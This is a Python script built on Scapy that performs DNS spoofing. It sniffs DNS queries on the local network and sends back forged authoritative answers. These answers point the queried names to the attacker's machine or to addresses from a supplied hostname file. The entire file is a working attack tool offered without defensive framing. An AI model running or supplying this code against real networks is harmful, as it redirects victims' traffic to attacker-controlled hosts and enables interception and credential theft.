from scapy.all import *
from scapy.layers.dns import DNSQR, DNSRR, DNS, DNSRROPT
from scapy.layers.inet import IP, UDP, Ether
from scapy.all import send
import getopt
import netifaces
from scapy.layers.inet6 import IPv6

conf.sniff_promisc=True
atkrAddr = '0.0.0.0'
interface = 'en0'
hostnames = False
poison_map = {}

def DnsInject(pkt):
	global hostnames
	global atkrAddr
	global interface

	if IPv6 or IP in pkt:
		if IP in pkt:
			ip = IP
		else:
			ip = IPv6	

		
		if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:
			name = 	str(pkt[DNS].qd.qname)
			print(name[2:len(name)-1])
			if (hostnames and (name[2:len(name)-1] in poison_map)):
				poisoned = poison_map[name[2:len(name)-1]]
			else:
				poisoned = atkrAddr
			attkPkt = ip(dst=pkt[ip].dst, src=pkt[ip].src)/UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/DNS(id=pkt[DNS].id, ra =1,aa =1,ancount =1,qd=pkt[DNS].qd, qr=1,ar=DNSRROPT(rrname='.',type = "OPT", rclass = 512), an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=poisoned))
			
			send(attkPkt, iface=interface)
			print (attkPkt.summary())

def main():
	global hostnames
	global atkrAddr
	global interface
	interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
	atkrAddr = netifaces.ifaddresses(str(interface))[netifaces.AF_INET][0]['addr']
	
	try:
		opt,ex = getopt.getopt(sys.argv[1:], "i:h:", ["interface", "hostname"])
	
	except getopt.GetoptError as err:
		print (err)
		sys.exit()
	
	for opts, arg in opt:
		if opts in ("-i", "--interface"):
			interface = arg
		elif opts in ("-h", "--hostname"):
			hostnames = True
			host_file = arg
		else:
			assert False, "wrong"

	if hostnames:
		try:
			with open(host_file, "r") as hostfile:
				for each_entry in hostfile:
					dns_map = each_entry.split()
					poison_map[dns_map[1] + "."] = dns_map[0]
		except IOError:
			return
	 
	

	try:
		sniff(iface = interface, filter = 'port 53', prn = DnsInject, store = 0)
	except:
		return

if __name__ == "__main__":
	main()

